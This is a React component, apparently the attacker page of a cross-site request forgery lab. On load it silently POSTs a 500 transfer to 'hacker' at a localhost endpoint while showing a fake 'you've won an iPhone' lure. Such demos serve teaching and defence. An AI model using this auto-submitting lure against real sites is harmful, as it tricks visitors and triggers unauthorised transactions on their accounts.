import React, { useEffect } from "react";
import axios from "axios";

import "./index.css";

function FakeAd() {
  useEffect(() => {
    // Automatically trigger the transfer when the page loads
    axios
      .post(
        "http://localhost:5000/transfer",
        {
          amount: 500,
          to: "hacker",
        },
        {
          headers: {
            "Content-Type": "application/json",
          },
        }
      )
      .catch((error) => {
        console.error("Transfer failed:", error);
        alert("Oops! Something went wrong.");
      });
  }, []);

  return (
    <div className="container fake-page">
      <h1>🎉 Congratulations! 🎉</h1>
      <p>You've won a free iPhone! Check your email for details.</p>
    </div>
  );
}

export default FakeAd;
